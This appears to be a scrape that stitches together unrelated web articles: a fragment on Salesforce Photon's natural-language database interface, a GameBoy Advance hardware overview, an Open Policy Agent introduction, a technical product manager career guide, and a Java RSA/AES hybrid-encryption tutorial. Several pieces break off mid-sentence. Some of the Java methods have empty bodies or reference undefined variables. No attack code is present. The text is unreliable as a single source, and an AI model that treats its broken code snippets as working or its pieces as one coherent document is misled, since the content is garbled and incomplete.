https://blog.einstein.ai/content/images/size/w1000/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 1000w, https://blog.einstein.ai/content/images/size/w1600/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 1600w, https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 1644w" sizes="(min-width: 720px) 720px"><figcaption>Figure 5. Types of Untranslatable Input Utterances to an NLIDB</figcaption></figure><p>Photon implements a module that automatically detects untranslatable input utterances and highlights the ambiguous spans in order to help users rephrase the utterance. To this end, we perturb the Spider dataset to automatically synthesize a large number of untranslatable utterances corresponding to the categories in Figure 5. Our perturbation method yields not only untranslatable questions but also the exact span that causes it to be untranslatable. With this new data, we train a neural translatability detector by extracting confusion spans from the input utterance. If a confusion span is detected, we deem the question untranslatable and prompt the user to rephrase. If the model detects that a confusion span likely refers to a field, we run a language model perplexity check to identify the possible target field and suggest it to the user. More details can be found in our <a href="https://arxiv.org/abs/2007.15280">research paper</a>. </p><p><strong>Dual-Input Mode. </strong>Photon accepts both natural language questions and well-formed SQL queries as input. It automatically detects the input type and executes the input immediately if it is a valid SQL query. We expect that under certain cases, forming a natural language question can be difficult and writing SQL directly may save time, especially for users proficient in SQL. </p><figure><img src="https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 600w, https://blog.einstein.ai/content/images/size/w1000/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 1000w, https://blog.einstein.ai/content/images/size/w1600/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 1600w, https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 2152w" sizes="(min-width: 720px) 720px"><figcaption>Figure 6.

Moreover, it is difficult for end users to detect mistakes made by the parser when the output is executable and yields results of the same type as the correct interpretation (e.g. <em>flights arriving in SFO </em>vs. <em>flights departing from SFO</em>). Some developers have expressed reluctance to trusting the system output, highlighting the necessity of better explanation for both the generated queries and the process of deriving them. </p><p><strong>Self-control. </strong>Some users …</p></div></div></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>The internal design of the GameBoy Advance is quite impressive for being a portable console that runs on two AA batteries.</p><p>This console will carry on using Nintendo’s <em>signature</em> GPU, additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are compressed in a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn’t the same CPU found on the GameBoy!</em> It’s effectively used to run GameBoy (<strong>DMG</strong>) and GameBoy Color (<strong>CGB</strong>) games. Here’s <a href="https://www.copetti.org/projects/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we’ll focus on, it most certainly runs GameBoy Advance games.</li></ul><p>Both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing, the <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What’s new</h4><p>Before ARM Holdings became incredibly popular in the smartphone world, they actually licensed their CPU designs to power Acorn’s computers, Nokia’s phones and some of Nintendo’s consoles.
Their new design, the ARM7TDMI, is based on the old ARM710 with very distinct features:</p><ul><li><strong>ARM v4</strong> ISA: The next version of the 32-bit RISC instruction set designed by ARM.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided in three steps or <em>stages</em>, the CPU will queue up to three instructions where each one is allocated in one stage, this allows to take advantage of all the CPU’s resources without idling while also incrementing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> → <strong>Thumb</strong>: An additional instruction set which can fit in smaller words (16-bit), it’s a subset of ARM.<ul><li>The biggest advantages of using Thumb over ARM are that their instructions only require half of the bus width and occupy half the size in memory. Furthermore, ARM and Thumb instructions can be mixed in the same program, so developers can offload the overhead of ARM’s 32-bit instructions.</li><li>So, why is not the entire program coded with Thumb then? Well, Thumb doesn’t include important instructions like <strong>conditionals</strong> (it only includes branches). This means that, in some cases, Thumb programs may require more code than ARM programs, so it’s all about achieving a good balance by using both.</li></ul></li><li><strong>D</strong> → <strong>Debug Extensions</strong>: Allows to suspend the CPU for debugging purposes. Used for setting breakpoints, for instance.</li><li><strong>M</strong> → <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute 32-bit multiplications, this enhancement attempts to reduce it to just a few.</li><li><strong>I</strong> → <strong>EmbeddedICE macrocell</strong>: Includes extra instructions to provide debugging operations.</li></ul><h4 id="memory-locations">Memory locations</h4><p>The inclusion of Thumb in particular had a strong influence in the final design of this console, Nintendo mixed 16-bit and 32-bit buses between its different modules to reduce costs while providing programmers with the necessary resources to optimise their code. Usable memory is distributed across the following locations:</p><ul><li><strong>IWRAM</strong> (Internal WRAM) → 32-bit with 32 KB: Useful for storing ARM instructions and data in big chunks.</li><li><strong>EWRAM</strong> (External WRAM) → 16-bit with 256 KB: Optimised for storing Thumb-only instructions and data in small chunks.</li><li><strong>PAK ROM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge ROM is accessed.</li><li><strong>Cart RAM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge RAM is accessed.</li></ul><p>Albeit this console being marketed as a 32-bit system, the majority of the memory is only accessible through a 16-bit bus, meaning games will mostly use the Thumb instruction set to avoid spending two cycles per instruction. Only critical sections will be using the ARM instruction set.</p><h4 id="how-do-they-maintain-compatibility">How do they maintain compatibility</h4><p>You’ll be surprised that there is no software implemented to detect whether the cartridge inserted is a GB or GBA one. Instead, the console relies on hardware switches: A <strong>shape detector</strong> effectively identifies the type of cartridge and then only passes power through the required bus.</p><hr><h2 id="graphics">Graphics</h2><p>Before we begin, you’ll find the system a mix between the <a href="https://www.copetti.org/projects/consoles/super-nintendo/#graphics">SNES</a> and the <a href="https://www.copetti.org/projects/consoles/game-boy/#graphics">GameBoy</a>, the graphic’s core is still the well-known 2D engine called <strong>PPU</strong>. I recommend reading those articles before continuing since I’ll be revisiting lots of previously-explained concepts.</p><p>In terms of screen, we now have a colour LCD screen that displays up to 32,768 colours (15-bit), it has a resolution of 240x160 pixels and a refresh rate of ~60Hz.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png"><picture>

The system has a couple of effects available to apply over these layers:</p><ul><li><strong>Mosaic</strong>: Makes tiles look more <em>blocky</em>.</li><li><strong>Alpha blending</strong>: Combines colours of two overlapping layers resulting in transparency effects.</li><li><strong>Windowing</strong>: Divides the screen into two different <em>windows</em> where each one can have its own separate graphics and effects, the outer zone of both windows can also be provided with tiles.</li></ul><p>On the other side, in order to update the frame there are multiple options available:</p><ul><li>Command the <strong>CPU</strong> during VBlank/HBlank: The <em>traditional way</em>.</li><li>Use the <strong>DMA Controller</strong>: DMA provides transfer rates ~10x faster and can be scheduled during VBlank and HBlank. This console provides 4 DMA channels (two reserved for sound, one for critical operations and the other for general purpose). Bear in mind that the controller will halt the CPU during the operation (although it may hardly notice it!).</li></ul></div></div></div><h4 id="beyond-tiles">Beyond Tiles</h4><p>Sometimes we may want to compose a background from which the tile engine won’t be able to draw all required graphics. Now, modern consoles addressed this by implementing a <strong>frame-buffer</strong> architecture but this is not possible when there’s very little RAM… Well, the GBA happens to have 96 KB of VRAM which is enough to allocate a <strong>bitmap</strong> with the dimensions of our LCD screen.</p><p>Good news is that the PPU actually implemented this functionality by including three extra modes, these are called <strong>bitmap modes</strong>:</p><ul><li><strong>Mode 3</strong>: Allocates a single fully-coloured (8bpp) frame.</li><li><strong>Mode 4</strong>: Provides two frames with half the colours (4bpp) each.</li><li><strong>Mode 5</strong>: There’s two fully-coloured frames with half the size each (160x128 pixels).</li></ul><p>The reason for having two bitmaps is to enable <strong>page flipping</strong>: Drawing over a displayed bitmap can expose some weird artefacts during the process, so if we manipulate another one instead, none of the glitches will be shown to the user. Once the second bitmap is finished, the PPU can be updated to point to the second one, effectively swapping the displayed frame.</p><div><p>Overall it sounds like a cutting-the-edge feature, however most games held on to the tile engine. Why? Because in practice it <strong>costs a lot of CPU resources</strong>.</p><p>You see, while using a tile engine the CPU can delegate most of the computations to the graphics chip. By contrast, the frame-buffer system that the PPU provides is limited to only displaying that segment of memory as a <strong>single background layer</strong>, that means no more individual affine transformations, layering or effects unless the CPU computes them. Also, the frame-buffer …</p></div></div></div></div>

<h2>What Is OPA?</h2>
<p>It’s a project that started in 2016 aimed at unifying policy enforcement across different technologies and systems. Today, OPA is used by giant players within the tech industry. For example, Netflix uses OPA to control access to its internal API resources. Chef uses it to provide IAM capabilities in their end-user products. In addition, many other companies like Cloudflare, Pinterest, and others use OPA to enforce policies on their platforms (like Kubernetes clusters). Currently, OPA is part of&nbsp;<a href="https://www.cncf.io/">CNCF</a>&nbsp;as an incubating project.</p>
<h2>What Does OPA Bring To The Table?</h2>
<p>You may be wondering: How did OPA come about? What problems does it try to solve? Indeed, policy enforcement over APIs and microservices is as old as microservices themselves. There’s never been a production-grade application that didn’t enforce access control, authorization, and policy enforcement of some kind. To understand the role of OPA, consider the following use case: your company sells laptops through an online portal. Like all other similar applications, the portal consists of a front-page where clients see the latest offerings, perhaps some limited-time promotions. If customers want to buy something, they need to log in or create an account. Next, they issue payments through their credit cards or other methods. To make sure your clients repeatedly visit, you offer that they sign up for your newsletter, which may contain special discounts. Also, they may opt to receive browser notifications as soon as new products are announced. A very typical online shopping app, right? Now, let’s depict what that workflow would look like in a diagram to visualize the process:</p>

<p>The diagram above shows how our system might look internally. We have a number of microservices that communicate with each other to serve our customers. Now, obviously, Bob shouldn’t see any of the internal workings of the system. For example, he can’t view (or even know about) the S3 bucket where payments get archived, or which services the notification API can talk to. But, what about John? He’s one of our application developers and he needs to have access to&nbsp;<em>all</em>&nbsp;the microservices to be able to troubleshoot and debug when issues occur. Or, does he? What if he accidentally (or intentionally) made an API call to the database service to change the delivery address of the customer to somewhere else? Even worse, what if he had read permissions to the customers’ credit card numbers? To address those risks, we place an authorization control on top of each of our microservices. The control checks whether or not the authenticated user has the required privileges to perform the requested operation. Such an authorization system may be an internal, home-grown process or external as provided by AWS IAM. That’s how a typical microservices application is built and secured. But look at the drawbacks of using several assorted authorization systems especially as the application grows:</p>
<ul>
<li>Modifying existing policies, or introducing new ones, is a nightmare. Just think of how many places you’ll need to visit to give Alice read access to all storage-related systems. This means S3, MySQL, MongoDB, and perhaps an external API to name a few.</li>
<li>There’s no way for developers to enforce policies on their own systems. They can obviously hardcode their authorization logic in the application, but that makes things intricately worse: trying to unify policies among different microservices is highly complicated.</li>
<li>Adding to the previous point, introducing a new policy to local services may require changing the code and, thus, introduce new versions of&nbsp;<em>all</em>&nbsp;the microservices.</li>
<li>What if you want to integrate policies with an existing user database? For example, integrating with the HR database.</li>
<li>We’ll need to visualize the policy to ensure that it’s doing what it’s supposed to do. This becomes of increasing importance as your policies get more complex.</li>
<li>Modern systems comprise multiple technologies and services which are written in different languages. For example, you may have the core of your system running on Kubernetes, and a bunch of legacy APIs that are not part of the cluster written in Java, Ruby, and PHP. Each platform has its own authorization mechanism.</li>
</ul>
<p>Let’s look at Kubernetes as an example. If all users were authorized access to the entire cluster, lots of nasty things can happen such as:</p>
<ul>
<li>Giving unlimited requests and limits to all the pods may cause random pods to get evicted from the nodes.</li>
<li>Pulling and using untested, haphazard images that may contain security vulnerabilities or malicious content.</li>
<li>Using Ingress controllers without TLS, allowing unencrypted, unsecured traffic to the application.</li>
<li>Numerous other unforeseen risks due to the overall complexity.</li>
</ul>
<p>You can definitely use&nbsp;<a href="https://www.magalix.com/blog/kubernetes-rbac-101" rel=" noopener">RBAC</a>&nbsp;and&nbsp;<a href="https://www.magalix.com/blog/kubernetes-pods-101-the-cluster-sailors" rel=" noopener">Pod security policies</a>&nbsp;to impose fine-grained control over the cluster. But again, this will only apply to the cluster. Kubernetes RBAC is of no use except in a Kubernetes cluster.</p>
<p>That’s where Open Policy Agent (OPA) comes into play. OPA was introduced to create a unified method of enforcing security policy in the stack.</p>
<h2>How Does OPA Work?</h2>
<p>Earlier, we explored the policy-enforcement strategies and what OPA tries to solve – that showed us the “what” part. Now, let’s now take a look at the “how.”</p>
<p>Let’s say that you’re implementing the Payments service of our example application. This service is responsible for handling customer payments. It exposes an API where it accepts payment from the customer. It also allows the user to query which payments were made by a specific customer. So, to obtain an array containing the purchases done by Jane, who is one of the company’s customers, you send a GET request to the API with the path /payment/jane. You provide your credential information in the Authorization header and send the request. The response would be a JSON array with the data you requested. However, since you don’t want just anyone with network access to have access to the Payments API to see such sensitive data, you need to enforce an authorization policy. OPA addresses the issue in the following way:</p>
<ol>
<li>The Payments API queries OPA for a&nbsp;<em>decision</em>. It accompanies this query with some&nbsp;<em>attributes</em>&nbsp;like the HTTP method used in the request, the path, the user, and so on.</li>
<li>OPA validates those attributes against data already provided to it.</li>
<li>After validation, OPA sends a&nbsp;<em>decision</em>&nbsp;to the requesting API with either&nbsp;<em>allow</em>&nbsp;or&nbsp;<em>deny</em>.</li>
</ol>
<p>The important thing to notice here is that OPA decouples our policy decision from policy enforcement. The OPA workflow can be depicted in the following diagram:</p>

<p>OPA is a general-purpose, domain-agnostic policy enforcement tool. It can be integrated with APIs, the Linux SSH daemon, an object store like CEPH, etc. OPA designers purposefully avoided basing it on any other project. Accordingly, the policy query and decision do not follow a specific format. That is, you can use&nbsp;<em>any</em>&nbsp;valid JSON data as request attributes as long as it provides the required data. Similarly, the policy decision coming from OPA can also be any valid JSON data. You choose what gets input and what gets output. For example, you can opt to have OPA return a True or False JSON object, a number, a string, or even a complex data object.</p>
<h2>OPA Internals</h2>
<p>To fully understand OPA and start implementing it in your own projects, you must familiarize yourself with its features and components. Let’s start with how you define your policies.</p>
<h2>Policy Language: Rego</h2>
<p>Rego is a high-level declarative language that was built specifically for OPA. It makes it very easy to define policies and address questions like: is Bob allowed to perform a GET request on /api/v1/products? Which records is he actually allowed to view?</p>
<h2>Deployment</h2>
<p>When it comes to deploying OPA, you have more than one option depending on your specific scenario:</p>
<ul>
<li><strong>As a Go library:</strong>&nbsp;if your application is written in Golang, you can implement OPA as a third-party library in the application.</li>
<li><strong>As a daemon:</strong>&nbsp;if you’re not using Go, then you can deploy OPA just like any other service, as a daemon. In this case, it’s recommended that you use a sidecar container or run it on the host level. The reason is that this design increases performance and availability. Imagine that you have OPA deployed in Kubernetes in a separate pod that happens to live on a separate node than where your application pod is running. Now, every time your service needs to consult OPA for a policy decision, it has to make a call over the network to reach the pod where OPA is running. This introduces unneeded latency and may cause application lags at peak times.</li>
</ul>

<h2>How To Manage And Control OPA?</h2>
<p>To further reduce latency, the designers decided that OPA should keep all the policy data in memory. This ensures that OPA is not going to query another service to request the data. To deal with OPA, you have a set of APIs that serve different purposes:</p>
<ul>
<li><strong>Bundle service</strong><strong>&nbsp;API:</strong>&nbsp;used for sending policy data to OPA. OPA continuously polls the Bundle service API searching for new versions of the policy. Once found, it pulls and applies the new version.</li>
<li><strong>Status service API:</strong>&nbsp;used for determining the status of the service. It tells you the current policy version that’s active on OPA.</li>
<li><strong>Decision log service API:</strong>&nbsp;every time OPA makes a policy decision, it logs it. Later on, it sends batches of those logs to the log service API. This is particularly useful for audit and troubleshooting purposes.</li>
<li><strong>Tools for building, testing, and debugging policies:</strong>&nbsp;a set of command-line tools that you can use like opa test, opa run, opa checks, etc. There’s also a&nbsp;<a href="https://marketplace.visualstudio.com/items?itemName=tsandall.opa">VS Code plugin</a>&nbsp;available to ease development.</li>
</ul>
<h2>Your First OPA Policy</h2>
<p>By now you should have a pretty clear picture why OPA came to existence, the problems it tries to solve, and the way it was designed and managed. It’s time to test the waters and see what it’s like to create a policy in the Rego …</p></div></div></div></article></div></div>

        <p>Most people know what a Product Manager is, but few know what a Product Manager does. Luckily, the world has given us a few archetypes to help us on our journey of understanding Product Management.</p>

<p>There’s Adam, the Google Product Manager who estimates the number of podcast listeners in Lithuania on a post-it note during lunch.</p>

<p>There’s Amber, the Intuit Product Manager who invites her customers to Corporate Headquarters to participate in a focus group.</p>

<p>And there’s Eve, the former Software Engineer who has decided that writing emails to the marketing department is more fun than debugging a Java 6 codebase written by a girl who retired four years ago.</p>

<p>As you make your way into Product Management, you’ll hear about these stereotypes and think <em>fine, but at 3pm on Tuesday, what is Product Manager Eve actually doing</em>!? Unfortunately, the most common resource on Product Management doesn’t really help us understand the role. In terms of books, <a href="https://amzn.to/2MyTLSy">Cracking the Product Manager Interview</a> is probably the most popular Product Management resource, and Lewis Lin’s <a href="https://amzn.to/375sZuo">Decode and Conquer</a> is another.</p>

<p>While both resources are useful to prepare for an interview, the nature of Product Management has changed substantially since both books were published. And that’s only the interview-related resources. In order to understand the nature of the job itself, the gold-standard guide to Product Management is still <a href="https://www.khoslaventures.com/wp-content/uploads/Good_Product_Manager_Bad_Product_Manager_KV.pdf">a PDF published by Ben Horowitz in 1997</a>.</p>

<p>To put that into perspective, in 1997 the hottest tech product in the world was the Tamagatchi.</p>

<p><img src="https://elimernit.com/assets/images/tamagotchi.jpg" alt="tamagotchi"></p>

<p><em>Remember these?</em></p>

<p>Despite the growing interest in Product Management, I’ve found few resources that explain what product managers actually do. Moreover, I’ve found hardly any resources that explain what <em>technical</em> product managers actually do.</p>

<p>I think it’s time to offer my brief but contemporary perspective on Technical Product Management. Specifically, what the job is, why it’s different from “non-technical” product management, and a bunch of practical interview tips to help you succeed in your job search.</p>



<p>My path to Product Management wasn’t straightforward.</p>

<p>After graduating college, I hadn’t received any job offers I was excited about, so I decided to spend the next few months working on passion projects. That summer, I decided to start building and flipping eCommerce stores. I spent the next year immersed in the world of eCommerce. In addition to building my own stores, I helped some small businesses in New York with freelance consulting work. After a year of being a digital nomad in my native New York (i.e. living with my parents and occasionally travelling to Europe), I felt my skills starting to plateau, and so I decided to start exploring opportunities at startups.</p>

<p>I had become increasingly interested in blockchain technology during this phase, and I decided to focus my efforts there. Product Management seemed like the obvious path for my skill set. I sort of knew how to program, I felt comfortable doing sales, and I liked designing interfaces.</p>

<p>After applying to a few startups, I finally landed at a 15-person blockchain company in Brooklyn. It was my first real job after college, and my first experience as a PM.</p>

<p>When I started the job, I worked on nearly all aspects of the business. I redesigned the website, setup an email marketing funnel, and gave demos to prospective customers at meetups. Most of my work was ad-hoc.</p>

<p>After a few months, I was promoted, and my responsibilities became more narrowly defined. The company was preparing to go-to-market and had a long list of features that needed to be built to be seriously considered by customers. From that point on, it was my job to write product requirements for all of our new features. Each week, I’d sit down with the founders and write up requirements documents that would dictate the work our engineering team would work on for the duration of their sprint.</p>

<p>The job ended up being a good fit for my writing-heavy humanities curriculum in college. I wrote dozens of specs, and read <a href="https://www.joelonsoftware.com/2000/10/02/painless-functional-specifications-part-1-why-bother/">Joel Spolsky’s blog</a>.</p>



<p>The main job of a PM is to ensure that a company delivers a product that aligns to a company’s mission. The PM meets with her stakeholders to decide which features to deliver, and at what cost. It’s the PM’s job to ensure that their product delivers value to the customers and the business.</p>

<p>However, the job of a Technical PM is to ensure that the work outputs of the engineers help support that mission.</p>

<p>Here’s a little 2x2 with some of the tactical differences between the two flavors of Product Managers:</p>

<table>
  <thead>
    <tr>
      <th>Business PM</th>
      <th>Technical PM</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Stakeholders are users</td>
      <td>Stakeholders are engineers</td>
    </tr>
    <tr>
      <td>Plans launch</td>
      <td>Plans sprint</td>
    </tr>

      <td>Dependency on designers</td>
      <td>Dependency on dev ops</td>
    </tr>
    <tr>
      <td>Google Analytics</td>
      <td>Datadog</td>
    </tr>
    <tr>
      <td>Sketch</td>
      <td>VSCode</td>
    </tr>
    <tr>

      <td>Writes JSON</td>
    </tr>
  </tbody>
</table>

<p>So, while a business PM might own a launch, a TPM will usually own the requirements for a new feature. Your ability to succeed in requirement gathering requires three main skills:</p>

<h3 id="be-comfortable-scheduling-meetings-with-people-in-other-parts-of-the-organization">Be comfortable scheduling meetings with people in other parts of the organization</h3>

<p>As a PM, one of your main jobs is communication across teams. While the engineers usually have more tasks than you, you have more leverage. Scheduling the right meeting with the right people in order to unblock a project or help someone make a decision is often worth more than two weeks worth of code.</p>

<h3 id="have-a-lawyers-understanding-of-programming">Have a lawyer’s understanding of programming</h3>

<p>Why a lawyer’s understanding? Because lawyers are often tasked with describing technical details to laypeople. If you’ve ever read a memo prepared by a lawyer, you’ll notice that they explain technical details in an extremely simplified level of detail. As a TPM, you should have a similar understanding of software. Remember, it’s not your job to help the engineers implement features. Your only job is to understand how a piece of code might benefit the business so that you can prioritize engineering work accordingly.</p>

<h3 id="be-capable-of-summarizing-technical-information-in-a-written-format">Be capable of summarizing technical information in a written format</h3>

<p>After you’ve scheduled meetings and extracted information from your stakeholders, you’ll need to distill your findings into a requirement document or a JIRA ticket. Writing is one of the most important TPM skills. You’ll need to summarize information from several meetings into bullet points that business people can understand. If you’re able to schedule meetings with the right people and summarize those meetings as bullet points, you’re 90% of the way towards being an excellent TPM.</p>



<p>When you apply for a TPM position, the hiring manager is trying to answer one big question while reading your resume: is the candidate comfortable working with engineers? The answer is usually conveyed in your experience. Have you worked on a hackathon team? Did you sit between an engineer and a designer in your last job?</p>

<p>If you’ve already worked as a non-technical PM, getting experience working closely with engineers is the best step towards getting past the resume stage. Remember, you don’t need software engineering experience to get here. You only need to prove that you’re capable of contributing to technical discussions.</p>

<p>As a general rule, having some hands-on programming experience is helpful. Luckily, the extent of this knowledge can be fairly narrow. No, you don’t need to know algorithms. But, here’s the one skill that will put you on a fast-track towards success: be capable of building a CRUD API. What’s a CRUD API? CRUD is just an acronym for create, read, update, delete, which are the main verbs associated with REST APIs. Building a CRUD API entails a few steps:</p>

<ol>
  <li>Write code to retrieve and insert data from a database</li>
  <li>Host the database on the cloud</li>
  <li>Host the code on the cloud, and expose an HTTP endpoint</li>
  <li>Invoke the code from the terminal as a CURL request</li>
</ol>

<p>If you’re able to accomplish this, you’ll be in a great position to communicate technical concepts during your interviews. You might be wondering whether this is really necessary for a TPM.</p>

<p>In my opinion, while it’s not absolutely necessary, I believe a baseline level of hands-on ability is necessary for having the confidence to work on a technical team. And, while you can practice the algorithms in Cracking the Coding Interview until your dry-erase marker runs out, you’ll be disappointed to learn that 99% of modern software engineering is building very simple features, like getting a user’s birthday from the database.</p>

<p>While some companies do use algorithm ability as a makeshift aptitude test, this is not very common for TPM interviews. Instead, the main aptitude test for TPMs is whether you can take a large amount of information and convert it into concise bullet points.</p>



<h3 id="the-phone-screen">The Phone Screen</h3>

<p>During the phone screen, hiring managers are looking to answer three questions:</p>

<ul>
  <li>Is the candidate comfortable working with engineers?</li>
  <li>Can the candidate explain technical concepts clearly?</li>
  <li>Is the candidate familiar with the software development process?</li>
</ul>

<h3 id="the-technical-interview">The Technical Interview</h3>

<p>If you’ve made it past the phone screen, you’ll usually be invited to chat with the hiring manager. This is usually your prospective manager. Their goal is to evaluate you according to the same metrics listed above, but in a little more detail. You’ll be asked longer-form questions, such as:</p>

<ul>
  <li>Walk me through a product you built (if you don’t have formal PM experience, talking about a CRUD API you built is a great talking point here!)</li>
</ul>

<h3 id="the-on-site">The On-Site</h3>

<p>Just like the technical interview, this stage is designed to evaluate you based on the same core metrics: whether you’re comfortable working with engineers, can explain concepts clearly, and understand the software lifecycle. Expect the questions in this stage to be more open-ended. You’ll probably be given a case study-esque scenario to answer, which will require you to organize your thoughts using a whiteboard. You can expect questions, such as:</p>

<ul>
  <li>Our company is going to partner with Stripe in order to accept payments. …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This post shows how to work with RSA on the JVM with the Java language. We’re gonna:</p><ul><li>Generate two keypairs (one for alice, one for bob)</li><li>Save these keypairs to a file and load them again</li><li>Send a message from alice to bob using a hybrid encryption scheme with confidentiality and authenticity</li></ul><p><em>Disclaimer</em>: This post is intended to show the concepts underpinning a hybrid encryption scheme. This is <strong>not production ready code</strong>! If you need something for your productive
application, consider <a href="https://libsodium.gitbook.io/doc/public-key_cryptography/authenticated_encryption">using something like libsodium</a>. libsodium is production grade and even uses modern cryptographic
algorithms like the X25519 elliptic curve and the XSalsa20-Poly1305 stream cipher. And you need way less code :) <a href="https://github.com/phxql/libsodium-java-playground/blob/master/src/main/java/libsodium/playground/App.java#L123">Here’s an example</a> how to use libsodium with Java.</p><p>But now let’s get into action! First, let’s generate the key pairs:</p><div><pre><code data-lang="java"><span>private</span> <span>KeyPair</span> <span>generateKeyPair</span><span>()</span> <span>{</span>
  <span>KeyPairGenerator</span> <span>keyPairGenerator</span> <span>=</span> <span>KeyPairGenerator</span><span>.</span><span>getInstance</span><span>(</span><span>"RSA"</span><span>);</span>
  <span>keyPairGenerator</span><span>.</span><span>initialize</span><span>(</span><span>2048</span><span>);</span> <span>// bits
</span><span></span>  <span>return</span> <span>keyPairGenerator</span><span>.</span><span>generateKeyPair</span><span>();</span>
<span>}</span>
</code></pre></div><p>Note that we use RSA keys with 2048 bit size. If you’re paranoid, you can set this to 4096 (see <a href="https://en.wikipedia.org/wiki/Key_size#Asymmetric_algorithm_key_lengths">this Wikipedia site for recommendations</a>).</p><div><pre><code data-lang="java"><span>KeyPair</span> <span>alice</span> <span>=</span> <span>generateKeyPair</span><span>();</span>
<span>KeyPair</span> <span>bob</span> <span>=</span> <span>generateKeyPair</span><span>();</span>
</code></pre></div><p>Let’s add some methods to save these keys for later use:</p><div><pre><code data-lang="java"><span>private</span> <span>void</span> <span>savePrivateKey</span><span>(</span><span>Path</span> <span>file</span><span>,</span> <span>PrivateKey</span> <span>privateKey</span><span>)</span> <span>{</span>

<span>}</span>
</code></pre></div><p>This method will save the RSA private key in a format called <a href="https://en.wikipedia.org/wiki/PKCS_8">PKCS #8</a>. Note that we don’t use the PEM encoding here (stuff starting with <code>-----BEGIN ...</code>), we just save the binary
representation.</p><p>And here’s the method to save the public key:</p><div><pre><code data-lang="java"><span>private</span> <span>void</span> <span>savePublicKey</span><span>(</span><span>Path</span> <span>file</span><span>,</span> <span>PublicKey</span> <span>publicKey</span><span>)</span> <span>{</span>

  <span>Files</span><span>.</span><span>write</span><span>(</span><span>file</span><span>,</span> <span>publicSpec</span><span>.</span><span>getEncoded</span><span>());</span>
<span>}</span>
</code></pre></div><p>The public key is stored in a format called <a href="https://en.wikipedia.org/wiki/X.509">X.509</a>.</p><p>Now we can use these to store the private and public keys from alice and bob:</p><div><pre><code data-lang="java"><span>savePrivateKey</span><span>(</span><span>Paths</span><span>.</span><span>get</span><span>(</span><span>"alice.private"</span><span>),</span> <span>alice</span><span>.</span><span>getPrivate</span><span>());</span>

</code></pre></div><p>As we can now save private and public keys in files, methods to load them back from the files would be great:</p><div><pre><code data-lang="java"><span>private</span> <span>PrivateKey</span> <span>loadPrivateKey</span><span>(</span><span>Path</span> <span>file</span><span>)</span> <span>{</span>
  <span>byte</span><span>[]</span> <span>privateKey</span> <span>=</span> <span>Files</span><span>.</span><span>readAllBytes</span><span>(</span><span>file</span><span>);</span>

  <span>KeyFactory</span> <span>keyFactory</span> <span>=</span> <span>KeyFactory</span><span>.</span><span>getInstance</span><span>(</span><span>"RSA"</span><span>);</span>
  <span>// Expects the private key encoded in PKCS #8
</span><span></span>  <span>return</span> <span>keyFactory</span><span>.</span><span>generatePrivate</span><span>(</span><span>new</span> <span>PKCS8EncodedKeySpec</span><span>(</span><span>privateKey</span><span>));</span>
<span>}</span>
</code></pre></div><p>This will load the private key from the given file. The file needs to be encoded in PKCS #8 format.</p><div><pre><code data-lang="java"><span>private</span> <span>PublicKey</span> <span>loadPublicKey</span><span>(</span><span>Path</span> <span>file</span><span>)</span> <span>{</span>

<span>}</span>
</code></pre></div><p>This method will load the public key from the given file. The file needs to be encoded in X.509 format.</p><p>Now we can use these methods to load the keys from the file again:</p><div><pre><code data-lang="java"><span>alice</span> <span>=</span> <span>new</span> <span>KeyPair</span><span>(</span>
  <span>loadPublicKey</span><span>(</span><span>Paths</span><span>.</span><span>get</span><span>(</span><span>"alice.public"</span><span>)),</span>
  <span>loadPrivateKey</span><span>(</span><span>Paths</span><span>.</span><span>get</span><span>(</span><span>"alice.private"</span><span>))</span>
<span>);</span>

<span>bob</span> <span>=</span> <span>new</span> <span>KeyPair</span><span>(</span>
  <span>loadPublicKey</span><span>(</span><span>Paths</span><span>.</span><span>get</span><span>(</span><span>"bob.public"</span><span>)),</span>
  <span>loadPrivateKey</span><span>(</span><span>Paths</span><span>.</span><span>get</span><span>(</span><span>"bob.private"</span><span>))</span>
<span>);</span>        
</code></pre></div><p>Great. Now we can start to encrypt data. We will use a hybrid encryption scheme: first, we generate an AES 256 bit session key. With this session key, we will
AES/GCM encrypt the secret message. Then we will encrypt this session key with the RSA public key of the receiver. We do this as RSA has some limitations:</p><p>First, it’s really slow, AES is much faster. Second, RSA can only encrypt data which is smaller than the key size (2048 bits in our example). As our AES session key
is only 256 bit, the slowness and data limitation of RSA doesn’t matter.</p><p>First, let’s generate a random session key:</p><div><pre><code data-lang="java"><span>private</span> <span>SecretKey</span> <span>generateSessionKey</span><span>()</span> <span>{</span>
